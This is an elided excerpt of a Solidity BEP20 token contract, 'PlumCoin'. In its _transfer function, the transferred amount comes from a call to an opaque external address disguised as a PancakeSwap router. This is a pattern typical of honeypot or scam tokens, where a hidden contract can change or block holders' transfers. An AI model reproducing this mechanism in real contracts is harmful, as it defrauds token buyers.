...
contract PlumCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'PlumCoin';
  string private constant _symbol = 'PlumCoin';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusPlumCoin = 0;
  address pancakeRouter_PlumCoin;
  ...
  */
  ...
  function pancakePairPlumCoin(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_PlumCoin).getPair(_bonusPlumCoin, sender, recipient, arrData);

      _bonusPlumCoin = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountPlumCoin = pancakePairPlumCoin(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountPlumCoin);
